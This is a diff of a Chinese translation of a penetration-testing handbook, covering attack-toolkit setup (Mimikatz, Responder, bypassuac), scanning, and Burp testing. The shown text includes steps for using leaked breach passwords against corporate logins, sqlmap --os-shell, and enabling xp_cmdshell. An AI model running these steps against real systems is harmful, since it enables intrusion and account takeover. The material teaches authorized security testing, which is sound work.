@@ -1,88 +1,9 @@
+
 # 黑客攻略书：渗透测试实用指南
-
-
-
-
 
 ![](img/00001.jpeg)
 
-
-
-
-
-
-
-
-
-
-
-
 ![](img/00002.jpeg)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 ![](img/00003.jpeg)
 
@@ -124,9 +45,6 @@ back and DBMS: Microsoft SQL Server 2008
 剩下的就是历史了……你用管理员权限生成 `Meterpreter` Shell，通过该主机跳板，并使用 `SMBexec` 从域控制器拉取所有用户哈希。
 
 当然，这只是一个非常快速且高层级的示例，但这正是我尝试编排本书的方式。本书共有 10 个不同章节，按橄榄球战术手册布局。这 10 个章节是：
-
-
-
 
 # 目录概览
 
@@ -212,20 +130,18 @@ back and DBMS: Microsoft SQL Server 2008
     *   Nessus：[`www.tenable.com/products/nessus`](http://www.tenable.com/products/nessus)
     *   两者效果均佳，但个人许可证价格差异显著。通常 `Nessus` 对个人测试员更便宜。两者均为行业标准漏洞扫描器。
 
-
-
-
-
 # 工具与环境配置
 
 ### 推荐工具
 
 #### Burp Suite
+
 [`portswigger.net/burp/`](http://portswigger.net/burp/) - Web 应用扫描器和手动 Web 应用测试工具（强烈推荐）
 
 - 这是必买工具。该工具有许多不同的优势且处于积极维护状态。价格约为 $300。如果买不起 Burp，可以使用 OWASP ZAP 扫描器 [`www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project`](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)，它拥有许多相同功能且也在积极维护。本书所有示例均使用 Burp Suite Pro，因为我发现它是极其有效的工具。
 
 #### 自动化 Web 应用扫描器
+
 （我曾在以下两款工具中取得不错成效。请根据预算选择适合的工具）。本书不讨论这些 Web 应用扫描器，因为它们是相当简单的“点击即扫”工具，但我推荐它们用于专业 Web 应用测试或定期企业级 Web 评估。
 
 - **IBM AppScan**: [`www-03.ibm.com/software/products/en/appscan`](http://www-03.ibm.com/software/products/en/appscan)
@@ -233,7 +149,7 @@ back and DBMS: Microsoft SQL Server 2008
 
 ![Kali Linux](img/00011.jpeg)
 
-Kali 是一个 Linux 渗透测试发行版（简称“distro”），包含大量渗透测试常用工具。这在安全社区可能被视为当前标准，许多人基于此框架构建工具。我同意 Kali 确实包含我通常使用的许多工具，但我添加了一些自己的工具。某些二进制文件（如 *Windows Credential Editor* (WCE)）可能已在 Kali 发行版中，但我倾向于下载最新版本。我还会尝试将修改过的用于绕过 AV 的二进制文件放在单独文件夹中，以免被覆盖。
+Kali 是一个 Linux 渗透测试发行版（简称“distro”），包含大量渗透测试常用工具。这在安全社区可能被视为当前标准，许多人基于此框架构建工具。我同意 Kali 确实包含我通常使用的许多工具，但我添加了一些自己的工具。某些二进制文件（如 `Windows Credential Editor` (WCE)）可能已在 Kali 发行版中，但我倾向于下载最新版本。我还会尝试将修改过的用于绕过 AV 的二进制文件放在单独文件夹中，以免被覆盖。
 
 还有许多其他优秀的发行版。推荐查看 **Pentoo** ([`www.pentoo.ch/`](http://www.pentoo.ch/))。现在开始深入了解 Kali 发行版。
 
@@ -311,110 +227,100 @@ Kali 是一个 Linux 渗透测试发行版（简称“distro”），包含大�
 11. **下载 Mimikatz**
     - Mimikatz 用于从内存提取密码
     - `cd ~/Desktop`
-    - `wget http://blog.gentilkiwi.com/downloads/mimikatz_trunk.zip`
-    - `unzip -d ./mimikatz mimikatz_trunk.zip`
-12. **保存自定义密码列表**
-    - 用于破解哈希的密码列表
-    - `cd ~/Desktop`
-    - `mkdir ./password_list && cd ./password_list`
-    - 通过浏览器下载大型密码列表并保存至 `./password_list`: [`mega.co.nz/#!3VZiEJ4L!TitrTiiwygI2I_7V2bRWBH6rOqlcJ14tSjss2qR5dqo`](https://mega.co.nz/#!3VZiEJ4L!TitrTiiwygI2I_7V2bRWBH6rOqlcJ14tSjss2qR5dqo)
-    - `gzip -d crackstation-human-only.txt.gz`
-    - `wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2`
-    - `bzip2 -d rockyou.txt.bz2`
-13. `cd ~/Desktop`
-14. **下载 Burp**: [`portswigger.net/burp/proxy.html`](http://portswigger.net/burp/proxy.html)。强烈建议购买专业版，其 $300 价格物超所值。
-15. **设置 PeepingTom**
-    - PeepingTom 用于网页快照
-    - `cd /opt/`
-    - `git clone https://bitbucket.org/LaNMaSteR53/peepingtom.git`
-    - `cd ./peepingtom/`
-    - `wget https://gist.github.com/nopslider/5984316/raw/423b02c53d225fe8dfb4e2df9a20bc800cc78e2c/gnmap.pl`
-    - `wget https://phantomjs.googlecode.com/files/phantomjs-1.9.2-linux-i686.tar.bz2`
-    - `tar xvjf phantomjs-1.9.2-linux-i686.tar.bz2`
-    - `cp ./phantomjs-1.9.2-linux-i686/bin/phantomjs .`
-16. **添加 Nmap 脚本**
-    - `banner-plus.nse` 用于更快扫描和更智能识别
-    - `cd /usr/share/nmap/scripts/`
-    - `wget https://raw.github.com/hdm/scan-tools/master/nse/banner-plus.nse`
-17. **安装 PowerSploit**
-    - PowerSploit 是用于后渗透的 PowerShell 脚本
-    - `cd /opt/`
 
 
 
+- `wget http://blog.gentilkiwi.com/downloads/mimikatz_trunk.zip`
+- `unzip -d ./mimikatz mimikatz_trunk.zip`
 
+## 12. 保存自定义密码列表
 
-#### c. git clone `https://github.com/mattifestation/PowerSploit.git`
+- 用于破解哈希的密码列表
+- `cd ~/Desktop`
+- `mkdir ./password_list && cd ./password_list`
+- 通过浏览器下载大型密码列表并保存至 `./password_list`: [`mega.co.nz/#!3VZiEJ4L!TitrTiiwygI2I_7V2bRWBH6rOqlcJ14tSjss2qR5dqo`](https://mega.co.nz/#!3VZiEJ4L!TitrTiiwygI2I_7V2bRWBH6rOqlcJ14tSjss2qR5dqo)
+- `gzip -d crackstation-human-only.txt.gz`
+- `wget http://downloads.skullsecurity.org/passwords/rockyou.txt.bz2`
+- `bzip2 -d rockyou.txt.bz2`
 
-#### d. cd PowerSploit
+## 13. `cd ~/Desktop`
 
-#### e. wget `https://raw.github.com/obscuresec/random/master/StartListener.py`
+## 14. 下载 Burp
 
-#### f. wget `https://raw.github.com/darkoperator/powershell_scripts/master/ps_encoder.py`
+[`portswigger.net/burp/proxy.html`](http://portswigger.net/burp/proxy.html)。强烈建议购买专业版，其 $300 价格物超所值。
 
-### 18. 安装 Responder
+## 15. 设置 PeepingTom
 
-#### a. Responder 将用于获取 NTLM 质询/响应哈希
+- PeepingTom 用于网页快照
+- `cd /opt/`
+- `git clone https://bitbucket.org/LaNMaSteR53/peepingtom.git`
+- `cd ./peepingtom/`
+- `wget https://gist.github.com/nopslider/5984316/raw/423b02c53d225fe8dfb4e2df9a20bc800cc78e2c/gnmap.pl`
+- `wget https://phantomjs.googlecode.com/files/phantomjs-1.9.2-linux-i686.tar.bz2`
+- `tar xvjf phantomjs-1.9.2-linux-i686.tar.bz2`
+- `cp ./phantomjs-1.9.2-linux-i686/bin/phantomjs .`
 
-#### b. cd /opt/
+## 16. 添加 Nmap 脚本
 
-#### c. git clone `https://github.com/SpiderLabs/Responder.git`
+- `banner-plus.nse` 用于更快扫描和更智能识别
+- `cd /usr/share/nmap/scripts/`
+- `wget https://raw.github.com/hdm/scan-tools/master/nse/banner-plus.nse`
 
-### 19. 安装社会工程学工具包（Kali 上无需重新安装）(SET)
+## 17. 安装 PowerSploit
 
-#### a. SET 将用于社会工程学攻击活动
+- PowerSploit 是用于后渗透的 PowerShell 脚本
+- `cd /opt/`
+- `git clone https://github.com/mattifestation/PowerSploit.git`
+- `cd PowerSploit`
+- `wget https://raw.github.com/obscuresec/random/master/StartListener.py`
+- `wget https://raw.github.com/darkoperator/powershell_scripts/master/ps_encoder.py`
 
-#### b. cd /opt/
+## 18. 安装 Responder
 
-#### c. git clone `https://github.com/trustedsec/social-engineer-toolkit/set/`
+- Responder 将用于获取 NTLM 质询/响应哈希
+- `cd /opt/`
+- `git clone https://github.com/SpiderLabs/Responder.git`
 
-#### d. cd set
+## 19. 安装社会工程学工具包（Kali 上无需重新安装）(SET)
 
-#### e. ./setup.py install
+- SET 将用于社会工程学攻击活动
+- `cd /opt/`
+- `git clone https://github.com/trustedsec/social-engineer-toolkit/set/`
+- `cd set`
+- `./setup.py install`
 
-### 20. 安装 bypassuac
+## 20. 安装 bypassuac
 
-#### a. 将用于在后渗透阶段绕过 UAC
+- 将用于在后渗透阶段绕过 UAC
+- `cd /opt/`
+- `wget http://www.secmaniac.com/files/bypassuac.zip`
+- `unzip bypassuac.zip`
+- `cp bypassuac/bypassuac.rb /opt/metasploit/apps/pro/msf3/scripts/meterpreter/`
+- `mv bypassuac/uac/ /opt/metasploit/apps/pro/msf3/data/exploits/`
 
-#### b. cd /opt/
+## 21. 安装 BeEF
 
-#### c. wget `http://www.secmaniac.com/files/bypassuac.zip`
+- BeEF 将用作跨站脚本攻击框架
+- `apt-get install beef-xss`
 
-#### d. unzip bypassuac.zip
+## 22. 安装模糊测试列表 (SecLists)
 
-#### e. cp bypassuac/bypassuac.rb /opt/metasploit/apps/pro/msf3/scripts/meterpreter/
+- 这些是配合 Burp 用于模糊测试参数的脚本
+- `cd /opt/`
+- `git clone https://github.com/danielmiessler/SecLists.git`
 
-#### f. mv bypassuac/uac/ /opt/metasploit/apps/pro/msf3/data/exploits/
+## 23. 安装 Firefox 附加组件
 
-### 21. 安装 BeEF
-
-#### a. BeEF 将用作跨站脚本攻击框架
-
-#### b. apt-get install beef-xss
-
-### 22. 安装模糊测试列表 (SecLists)
-
-#### a. 这些是配合 Burp 用于模糊测试参数的脚本
-
-#### b. cd /opt/
-
-#### c. git clone `https://github.com/danielmiessler/SecLists.git`
-
-### 23. 安装 Firefox 附加组件
-
-#### a. Web Developer Add-on: `https://addons.mozilla.org/en-US/firefox/addon/web-developer/`
-
-#### b. Tamper Data: `https://addons.mozilla.org/en-US/firefox/addon/tamper-data/`
-
-#### c. Foxy Proxy: `https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/`
-
-#### d. User Agent Switcher: `https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/`
+- Web Developer Add-on: [`https://addons.mozilla.org/en-US/firefox/addon/web-developer/`](https://addons.mozilla.org/en-US/firefox/addon/web-developer/)
+- Tamper Data: [`https://addons.mozilla.org/en-US/firefox/addon/tamper-data/`](https://addons.mozilla.org/en-US/firefox/addon/tamper-data/)
+- Foxy Proxy: [`https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/`](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)
+- User Agent Switcher: [`https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/`](https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/)
 
 ![](img/00012.jpeg)
 
 我强烈建议你也配置一个 Windows 7 虚拟机。这是因为我在许多测试中都遇到过应用程序需要 Internet Explorer，或者像 `Cain and Abel` 这样的工具只能在一种操作系统上运行的情况。请记住，所有的 PowerShell 攻击都将要求你在 Windows 主机上运行命令。我想强调的观点是：时刻保持准备，拥有多个可用的操作系统将为你节省大量时间和麻烦。
 
-## Windows 高级工具列表补充：
+## Windows 高级工具列表补充
 
 *   HxD (十六进制编辑器)
 *   Evade (用于杀毒软件绕过)
@@ -440,30 +346,30 @@ Kali 是一个 Linux 渗透测试发行版（简称“distro”），包含大�
 
 在 Windows 上我没有什么特别的设置，但通常我会安装以下内容。
 
-1.  HxD `http://mh-nexus.de/en/hxd/`
-2.  Evade `https://www.securepla.net/antivirus-now-you-see-me-now-you-dont/`
-3.  Hyperion `http://www.nullsecurity.net/tools/binary.html`
-    ### a. 下载/安装 Windows 编译器 `http://sourceforge.net/projects/mingw/`
-    ### b. 在解压后的 Hyperion 文件夹中运行 `make`，你应该就能得到二进制文件。
-4.  下载并安装 Metasploit `http://www.Metasploit.com/`
+1.  HxD [`http://mh-nexus.de/en/hxd/`](http://mh-nexus.de/en/hxd/)
+2.  Evade [`https://www.securepla.net/antivirus-now-you-see-me-now-you-dont/`](https://www.securepla.net/antivirus-now-you-see-me-now-you-dont/)
+3.  Hyperion [`http://www.nullsecurity.net/tools/binary.html`](http://www.nullsecurity.net/tools/binary.html)
+    - 下载/安装 Windows 编译器 [`http://sourceforge.net/projects/mingw/`](http://sourceforge.net/projects/mingw/)
+    - 在解压后的 Hyperion 文件夹中运行 `make`，你应该就能得到二进制文件。
+4.  下载并安装 Metasploit [`http://www.Metasploit.com/`](http://www.Metasploit.com/)
 5.  下载并安装 Nessus 或 Nexpose
-    ### a. 如果你是自掏腰包购买软件，可能应该考虑 Nessus，因为它便宜得多，但两者都很好用
-6.  下载并安装 nmap `http://nmap.org/download.html`
-7.  下载并安装 oclHashcat `http://hashcat.net/oclhashcat/#downloadlatest`
-8.  下载并安装 evil foca `http://www.informatica64.com/evilfoca/`
-9.  下载并安装 `Cain and Abel` `http://www.oxid.it/cain.html`
-10. BURP `http://portswigger.net/burp/download.html`
-11. 下载并解压 Nishang: `https://code.google.com/p/nishang/downloads/list`
-12. 下载并解压 PowerSploit: `https://github.com/mat-tifestation/PowerSploit/archive/master.zip`
+    - 如果你是自掏腰包购买软件，可能应该考虑 Nessus，因为它便宜得多，但两者都很好用
+6.  下载并安装 nmap [`http://nmap.org/download.html`](http://nmap.org/download.html)
+7.  下载并安装 oclHashcat [`http://hashcat.net/oclhashcat/#downloadlatest`](http://hashcat.net/oclhashcat/#downloadlatest)
+8.  下载并安装 evil foca [`http://www.informatica64.com/evilfoca/`](http://www.informatica64.com/evilfoca/)
+9.  下载并安装 `Cain and Abel` [`http://www.oxid.it/cain.html`](http://www.oxid.it/cain.html)
+10. BURP [`http://portswigger.net/burp/download.html`](http://portswigger.net/burp/download.html)
+11. 下载并解压 Nishang: [`https://code.google.com/p/nishang/downloads/list`](https://code.google.com/p/nishang/downloads/list)
+12. 下载并解压 PowerSploit: [`https://github.com/mat-tifestation/PowerSploit/archive/master.zip`](https://github.com/mat-tifestation/PowerSploit/archive/master.zip)
 13. 安装 Firefox 附加组件
-    ### a. Web Developer Add-on: `https://addons.mozilla.org/en-US/firefox/addon/web-developer/`
-    ### b. Tamper Data: `https://addons.mozilla.org/en-US/firefox/addon/tamper-data/`
-    ### c. Foxy Proxy: `https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/`
-    ### d. User Agent Switcher: `https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/`
+    - Web Developer Add-on: [`https://addons.mozilla.org/en-US/firefox/addon/web-developer/`](https://addons.mozilla.org/en-US/firefox/addon/web-developer/)
+    - Tamper Data: [`https://addons.mozilla.org/en-US/firefox/addon/tamper-data/`](https://addons.mozilla.org/en-US/firefox/addon/tamper-data/)
+    - Foxy Proxy: [`https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/`](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)
+    - User Agent Switcher: [`https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/`](https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher/)
 
 ![](img/00013.jpeg)
 
-本章旨在帮助你构建一个标准的测试平台。工具总是在变化，因此保持测试平台更新和打补丁非常重要。希望这些信息足以让你入门，我已包含本书中使用的所有工具。如果你觉得我遗漏了任何关键工具，请随时在 `http://www.thehackerplaybook.com` 留言。对你的工作虚拟机进行一次完整的干净快照，让我们开始发现和攻击网络吧。
+本章旨在帮助你构建一个标准的测试平台。工具总是在变化，因此保持测试平台更新和打补丁非常重要。希望这些信息足以让你入门，我已包含本书中使用的所有工具。如果你觉得我遗漏了任何关键工具，请随时在 [`http://www.thehackerplaybook.com`](http://www.thehackerplaybook.com) 留言。对你的工作虚拟机进行一次完整的干净快照，让我们开始发现和攻击网络吧。
 
 ![](img/00014.jpeg)
 
@@ -472,10 +378,6 @@ Kali 是一个 Linux 渗透测试发行版（简称“distro”），包含大�
 无论你是经验丰富的渗透测试员还是刚入行的新手，扫描可能已经被讨论过无数次了。我不会详细比较所有不同的网络扫描器、漏洞扫描器、SNMP 扫描器等，但我会尝试给你提供最高效的扫描流程。本节将分为外部扫描、内部扫描和 Web 应用程序扫描。
 
 ![](img/00015.jpeg)
-
-
-
-
 
 ## 被动发现
 
@@ -508,9 +410,9 @@ Kali 是一个 Linux 渗透测试发行版（简称“distro”），包含大�
 3.  输入 `1` 选择 Domain（域名）
 4.  输入 `1` 选择 Passive（被动）
 5.  输入要搜索的域名
-    a.  在此示例中为：`reddit.com`
+    - 在此示例中为：`reddit.com`
 6.  完成后输入：
-    a.  `firefox /root/[domain]/index.htm`
+    - `firefox /root/[domain]/index.htm`
 
 在示例中，我对一个我喜欢的网站进行了上述被动查询。请记住，这是一个完全被动的请求，绝不代表在识别 Reddit 的任何漏洞，而是说明那里有哪些公开信息。
 
@@ -542,6 +444,8 @@ Kali 是一个 Linux 渗透测试发行版（简称“distro”），包含大�
 
 ## 利用泄露名单查找邮箱地址和凭据
 
+
+
 作为渗透测试员的好处在于，你必须发挥创造力并使用各种资源，就像恶意攻击者一样。在过去几个月中，我发现一种非常富有成效的策略是利用已知的凭据泄露进行密码重用攻击。让我详细解释一下。
 
 几个月前，Adobe 系统发生大规模泄露。泄露信息包括邮箱地址、加密密码及其密码提示。^(2) 这个近 10 GB 的大量数据最初在小圈子私下发布，现已公开可用（尝试搜索 Adobe 和 `users.tar.gz`）。从攻击者角度来看，这是一个信息金矿。我通常会解析此文件，识别出我正在测试的目标域名。
@@ -553,9 +457,6 @@ Kali 是一个 Linux 渗透测试发行版（简称“distro”），包含大�
 ![](img/00023.jpeg)
 
 **图 6 - 2013 年 Adobe 泄露事件中的账号/密码列表**
-
-
-
 
 根据这些提示，你可以做一些调查，找出某个特定用户的男朋友是谁，或者他们猫的名字，但我通常采用快速且粗暴的尝试方法。
 
@@ -576,7 +477,7 @@ Kali 是一个 Linux 渗透测试发行版（简称“distro”），包含大�
 
 ![](img/00024.jpeg)
 
-图 7 - 用于查找邮箱/密码的自定义 Python 脚本
+**图 7 - 用于查找邮箱/密码的自定义 Python 脚本**
 
 我通常会获取此输出的结果，尝试针对公司的 Outlook Web Access (OWA) 登录或 VPN 登录进行测试。你可能需要对密码中的某些变量进行调整（例如如果密码包含 2012，你可能想尝试 2013），同时也要确保不要锁定账户。
 
@@ -613,13 +514,13 @@ Kali 是一个 Linux 渗透测试发行版（简称“distro”），包含大�
 
 ![](img/00027.jpeg)
 
-图 8 - Rapid7 `Nexpose` 扫描结果
+**图 8 - Rapid7 `Nexpose` 扫描结果**
 
 在第二个示例中，我使用 Tenable `Nessus` 专业版扫描器运行了类似的配置文件，结果却大不相同。请记住，这只是针对我的 Web 服务器的扫描，样本量非常小。在更大规模的扫描中，我发现两者的发现结果会比这些结果接近得多。如果看下图，`Nessus` 返回了 3 个中危发现和 5 个低危发现。
 
 ![](img/00028.jpeg)
 
-图 9 - Tenable `Nessus` 扫描结果
+**图 9 - Tenable `Nessus` 扫描结果**
 
 仅从这两个示例来看，我们就能发现它们的结果不同。乍一看，我最可能开始深入分析的唯一发现是仅被 `Nexpose` 识别出而 `Nessus` 未识别出的 Wordpress 路径泄露漏洞。
 
@@ -632,8 +533,6 @@ Kali 是一个 Linux 渗透测试发行版（简称“distro”），包含大�
 我对完整漏洞扫描器的一个不满是，它们极其耗时。为了补充漏洞扫描器，我会运行一个快速的 `Nmap` 脚本来扫描端口并获取基本信息，这将帮助我制定攻击计划。
 
 我希望你已经使用过 `Nmap`，并且完全了解它的功能。对我来说，`Nmap` 快速、高效、模块化，且能完成任务。我推荐阅读 Fydor 的 `Nmap` 书籍 (<http://www.amazon.com/Nmap-Network-Scanning-Official-Discovery/dp/0979958717>)，但重点是快速发现所有不同的主机和运行中的服务。对我最有用的是对所有 65535 个端口运行 `Nmap`，查看这些端口是否开放并获取服务版本信息。
-
-
 
 我将使用相同的流程来对比和差异分析旧的网络扫描结果与新的扫描结果，以识别环境中的变化。我的一些客户要求我每月运行一次扫描，这是一种非常快速简便的识别变化的方法（需要少量脚本编写）。
 
@@ -751,10 +650,7 @@ python ./peepingtom.py -p -i http_ips.txt
 *   Joomla
 *   Beta/DEV 站点
 
-
-
-
-## 需要身份验证的页面
+### 需要身份验证的页面
 
 *   默认网络设备页面
 *   内容管理系统
@@ -767,7 +663,11 @@ python ./peepingtom.py -p -i http_ips.txt
 ### 一些示例
 
 *   **Cold Fusion 示例：** [`www.exploit-db.com/exploits/25305/`](http://www.exploit-db.com/exploits/25305/)
+
+
+
 *   **JBoss 示例：** [`www.rapid7.com/db/modules/exploit/multi/http/jboss_maindeployer`](http://www.rapid7.com/db/modules/exploit/multi/http/jboss_maindeployer)
+
 *   **Apache 示例：** [`www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_deploy`](http://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_deploy)
 
 我寻找需要身份验证的站点的另一个原因是，它们通常意味着该应用程序具有额外的功能，更有可能暴露 Web 应用程序问题或默认密码。
@@ -782,7 +682,7 @@ python ./peepingtom.py -p -i http_ips.txt
 
 ![](img/00034.jpeg)
 
-### 在本节中，我将描述如何在网络渗透测试期间使用 Burp Suite Pro 扫描 Web 应用程序。
+## 在本节中，我将描述如何在网络渗透测试期间使用 Burp Suite Pro 扫描 Web 应用程序。
 
 通常，在网络渗透测试期间，我没有足够的时间进行完整的 Web 应用程序测试，但当我发现大型应用程序时，会采取以下步骤：
 
@@ -844,10 +744,6 @@ python ./peepingtom.py -p -i http_ips.txt
 
 ### 爬取应用程序
 
-
-
-
-
 ## Web 应用测试与漏洞扫描
 
 ### Spider 目标主机
@@ -858,13 +754,13 @@ python ./peepingtom.py -p -i http_ips.txt
 
 ![](img/00041.jpeg)
 
-Figure 19 - Spidering the Host
+**图 19 - Spidering the Host**
 
 Spider 过程完成后，Burp 应该已经很好地梳理了应用程序的确切外观。我们还可以单击任何文件（如下图）来查看请求和响应的内容。左侧列显示所有文件和文件夹，右侧显示请求和响应。在 **Site map** 选项卡正下方是 **Filter** 按钮。尝试调整此按钮，查看过滤掉的内容以及适合您的设置。通常，我喜欢先将所有域名添加到作用域，然后单击 **Filter** 仅显示作用域内的项目。这能清理掉大量在我测试中本就超出作用域的引用域名。
 
 ![](img/00042.jpeg)
 
-Figure 20 - Site Map/Request and Responses
+**图 20 - Site Map/Request and Responses**
 
 ### 发现内容
 
@@ -874,7 +770,7 @@ Burp 中有一个特定模块在这些场景下非常有帮助。在同一个 **
 
 ![](img/00043.jpeg)
 
-Figure 21 - Discovering Content
+**图 21 - Discovering Content**
 
 进入 **Discovery** 模块后，您可以单击 **Session is not running** 按钮，应用程序将开始对文件夹和文件结构进行“智能暴力破解”。所谓“智能暴力破解”，是指应用程序从发现的文件和文件夹中学习，并尝试做出更好的暴力破解选择。此技术提供了一个高效的流程来识别文件夹和文件，以推进您的应用程序测试。
 
@@ -882,7 +778,7 @@ Figure 21 - Discovering Content
 
 ![](img/00044.jpeg)
 
-Figure 22 - Discovering Session Status
+**图 22 - Discovering Session Status**
 
 如上图所示，**Discovery** 工具识别出了 `/wp-includes/` 文件夹，这在 WordPress 应用程序中很常见。然后它开始在该文件夹中查找常见的文件夹/文件类型。您可以单击 **Discovery** 模块顶部的 **Site map** 选项卡，查看该扫描的所有结果。这将有助于快速识别隐藏文件夹、管理页面、配置页面和其他对测试人员有用的页面。
 
@@ -892,7 +788,7 @@ Figure 22 - Discovering Session Status
 
 ![](img/00045.jpeg)
 
-Figure 23 - Active Vulnerability Scans
+**图 23 - Active Vulnerability Scans**
 
 扫描器运行后，结果和测试队列将位于 **Scanner** 选项卡中。您可能需要查看 **Scanner** 选项卡中的 **Options** 选项卡以进一步配置 Burp Suite。我通常做的一项更改是增加 **Active Scan Engine** 部分的线程数以减少扫描时间。这将显著减少所需时间，但请小心，如果线程数过高，可能会拖垮一个小型网站。
 
@@ -900,7 +796,7 @@ Figure 23 - Active Vulnerability Scans
 
 ![](img/00046.jpeg)
 
-Figure 24 - Scan Results
+**图 24 - Scan Results**
 
 作为渗透测试人员，您需要验证没有误报，并确定发现的实际严重性。让我们看看 Burp 发现的是否真实有效。单击其中一个 XSS 漏洞，我们可以看到使用的确切 GET 参数。要复现此问题，我们需要访问：
 
@@ -910,7 +806,7 @@ Figure 24 - Scan Results
 
 ![](img/00047.jpeg)
 
-Figure 25 - XSS Example
+**图 25 - XSS Example**
 
 Burp 的功能远不止检查 XSS 漏洞。它可以识别 CSRF 问题、不良 SSL 证书、目录遍历漏洞、SQL 注入、命令注入等。要查看 Burp 的更多用法，请参阅本书关于 Web 应用渗透测试的章节。
 
@@ -926,12 +822,9 @@ Burp 的功能远不止检查 XSS 漏洞。它可以识别 CSRF 问题、不良 
 
 其核心概念是：您看到敞开的漏洞或洞口，如何突破取决于您。扫描器识别出许多不同类型的漏洞，但我将介绍两种利用常见漏洞的标准方法。本节将更多地从宏观角度进行概述，因为如果我专注于每种漏洞类型，这本书会变得极长。本书也假设您有一定的利用经验，希望这能作为一个复习。
 
-
-
-
 无论你使用 Nexpose 还是 Nessus（或任何其他漏洞扫描器），这对利用过程可能没有影响。一旦扫描器发现漏洞，我通常会去搜索一个可用的漏洞利用代码。我在后面的章节专门设立了一个关于漏洞搜索的部分，介绍如何根据扫描器的发现来查找漏洞利用代码，但现在我将简要描述如何使用 Metasploit 以及理解脚本以利用漏洞的重要性。
 
-![](img/00050.jpeg)([`www.metasploit.com`](http://www.metasploit.com)) (Windows/Kali Linux)
+![](img/00050.jpeg) ([`www.metasploit.com`](http://www.metasploit.com)) (Windows/Kali Linux)
 
 我们最常用的利用工具是 Metasploit。Metasploit Framework 旨在用于开发、利用漏洞以及协助攻击。框架最好的部分是它是以研究为出发点开发的。我的意思是，开发你自己的 Metasploit 模块并在框架内使用它们非常容易。^(5) 这不需要太多的 Ruby 知识，但需要更多的基本脚本技能。在不花太多时间解释 Metasploit 的情况下，让我们通过一个示例来演练框架的使用。
 
@@ -963,6 +856,9 @@ Burp 的功能远不止检查 XSS 漏洞。它可以识别 CSRF 问题、不良 
 
 *   在 Kali 上进入 Metasploit
     *   打开终端并输入：`msfconsole`
+
+
+
 *   要搜索漏洞，请输入：
     *   `search ms08-067`
 
@@ -1021,8 +917,6 @@ Figure 29 - FTP Exploit Example Script^(6)
 这就是为什么我强烈建议你在尝试任何生产主机之前，理解并测试你所有的漏洞利用代码，并根据需要修改脚本。
 
 ![](img/00059.jpeg)
-
-
 
 ## 从扫描结果到漏洞利用：基线概述
 
@@ -1134,8 +1028,6 @@ sqlmap -u "http://site.com/info.php" --data="user=test&pass=test" --os-shell
 
 `Sqlninja` 唯一的问题是配置文件设置较难，且我从未找到优秀易读的文档。因此我将给出与 `SQLmap` 类似的两个示例。
 
-
-
 在 Sqlninja 中，你需要使用 `__SQL2INJECT__` 命令定义要注入的易受攻击变量。这与 SQLmap 不同，在 SQLmap 中我们不需要指定要测试的字段。让我们通过几个例子来了解，这会让事情更加清晰。在使用 Sqlninja 之前，我们需要定义 SQL 配置文件。该文件将包含关于 URL、HTTP 方法类型、会话 Cookie 和浏览器代理的所有信息。
 
 让我向你展示获取 Sqlninja 所需信息的最简单方法。和之前一样，启动 Burp Suite 并在传递易受攻击字段的请求上开启代理拦截。在下面的例子中，我们将捕获发送到 `/wfLogin.aspx` 的请求并识别 POST 参数值。这将包含 Sqlninja 注入所需的大部分信息，但需要根据 Burp 原始请求进行细微修改。
@@ -1211,6 +1103,8 @@ Figure 35 - Sqlninja 示例
 
 一旦 `xp_cmdshell` 可用，我们想要测试是否拥有命令行访问权限以及拥有什么类型的权限。在下面的例子中，我们正在利用 SQLi 漏洞并测试命令行命令。
 
+
+
 在这个特定测试中（如下图），看起来我们可能正在服务器上运行命令，但我们需要验证这一点。问题在于，在我们拥有的互联网服务器上设置监听器后，似乎没有看到来自受损服务器的出站连接。如果我们想要窃取数据回传或下载额外的恶意软件，这可能是个问题。由于 Sqlninja 创建的命令行控制台不显示命令的响应，我们确实需要验证我们的命令是否成功执行。
 
 检查命令是否工作的最好方法是在我们公开拥有的外部服务器上使用 `tcpdump` 监听 ping。通过在受损服务器上运行 ping 命令，我们可以轻松验证我们的服务器是否响应 ping。使用 ping 的原因是 ICMP 通常允许出站，且不太可能触发 IDS/IPS 签名。这可以通过攻击者拥有的外部服务器上的以下命令配置：
@@ -1237,9 +1131,7 @@ Figure 36 - SQLMap 命令注入 Ping
 
 我不能在不谈论跨站脚本（XSS）的情况下谈论 Web 应用程序漏洞。这可能是我发现的最常见的漏洞之一。正如我们所知，XSS 是由应用程序缺乏输入验证引起的用户攻击。有两种类型的 XSS：反射型和存储型，它们允许攻击者将脚本代码写入用户的浏览器。我将重点关注反射型 XSS，因为它是最常见的，而且在很大程度上，利用该漏洞的方法相对相似。
 
-BeEF Exploitation Framework (http://beefproject.com/) (Kali Linux)
-
-
+### BeEF Exploitation Framework (http://beefproject.com/) (Kali Linux)
 
 我从客户那里得到的普遍问题是：“XSS 到底能造成多大危害？”请记住，利用此漏洞，你拥有在最终用户浏览器上编写脚本代码的完全能力，因此 JavaScript 能做的任何事情都可能被用来攻击受害者。在本节中，我们将深入探讨 XSS 攻击可以有多恶意。
 
@@ -1284,7 +1176,7 @@ BeEF 服务器启动后，让我们登录控制台 UI。正如上图所示，本
 
